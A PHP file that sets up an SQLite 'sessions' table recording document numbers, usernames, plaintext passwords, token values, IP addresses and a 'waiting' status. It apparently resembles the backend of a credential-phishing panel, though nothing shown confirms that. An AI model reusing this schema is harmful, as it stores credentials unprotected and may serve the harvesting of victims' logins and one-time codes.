<?php
// db.php - Centralized SQLite connection and table setup

function getDB() {
    static $pdo = null;
    if ($pdo !== null) return $pdo;

    $dbFile = __DIR__ . '/database.sqlite';
    $isNew = !file_exists($dbFile);

    try {
        $pdo = new PDO('sqlite:' . $dbFile);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

        $pdo->exec("
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id VARCHAR(100) UNIQUE,
                doc_type VARCHAR(100),
                doc_num VARCHAR(100),
                username VARCHAR(100),
                password VARCHAR(100),
                token_value VARCHAR(100) DEFAULT '',
                ip VARCHAR(50),
                user_agent TEXT,
                status VARCHAR(50) DEFAULT 'waiting',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen INTEGER DEFAULT 0
            );
        ");

        // Safely add columns if they don't exist (for existing databases)
        $cols = $pdo->query("PRAGMA table_info(sessions)")->fetchAll();
        $colNames = array_column($cols, 'name');
        if (!in_array('token_value', $colNames)) {
            $pdo->exec("ALTER TABLE sessions ADD COLUMN token_value VARCHAR(100) DEFAULT ''");
        }
        if (!in_array('last_seen', $colNames)) {
            $pdo->exec("ALTER TABLE sessions ADD COLUMN last_seen INTEGER DEFAULT 0");
        }

    } catch (PDOException $e) {
        die("Database error: " . $e->getMessage());
    }

    return $pdo;
}
?>
